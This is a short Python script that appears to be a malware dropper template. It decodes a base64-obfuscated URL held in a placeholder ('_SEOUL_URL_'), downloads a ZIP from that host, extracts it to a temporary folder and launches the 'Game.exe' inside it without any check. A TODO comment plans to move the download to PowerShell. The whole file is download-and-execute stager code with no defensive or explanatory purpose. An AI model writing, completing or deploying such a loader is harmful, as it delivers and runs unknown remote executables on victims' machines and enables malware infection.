import requests
import base64
import os
import zipfile
import io
import subprocess
import tempfile
from urllib.parse import unquote

# TODO: add powershell downloading instead of requests
def download_zip(url):
    try:
        padding = len(url) % 4
        if padding:
            url += "=" * (4 - padding)
            
        decoded_bytes = base64.b64decode(url)
        decoded_url = decoded_bytes.decode('utf-8')
        
        clean_url = unquote(decoded_url)
        
        if not clean_url.startswith(('http://', 'https://')):
            clean_url = 'http://' + clean_url
            
        print(f"[*] Downloading zip file...") 
        r = requests.get(clean_url)
        r.raise_for_status()
        return r.content
        
    except Exception as e:
        print(f"[!] Download failed: {e}")
        return None


def extract_and_run(zip_data):
    try:
        with tempfile.TemporaryDirectory() as tmpdir:
            print(f"[*] Extracting to {tmpdir}")
            with zipfile.ZipFile(io.BytesIO(zip_data)) as z:
                z.extractall(tmpdir)

            exe_path = os.path.join(tmpdir, "Game.exe")
            if os.path.exists(exe_path):
                print(f"[*] Running {exe_path}")
                # Safer execution without shell=True
                subprocess.Popen([exe_path], cwd=tmpdir)
            else:
                print("[!] EXE not found in ZIP! Contents:")
                print(os.listdir(tmpdir))
    except Exception as e:
        print(f"[!] Extraction failed: {e}")


def main():
    url = '_SEOUL_URL_'  
    execuatable_name = "_SEOUL_EXE_" # working on it
    
    zip_data = download_zip(url)
    if zip_data:
        extract_and_run(zip_data)
    else:
        print("[!] No ZIP data received")


if __name__ == "__main__":
    main()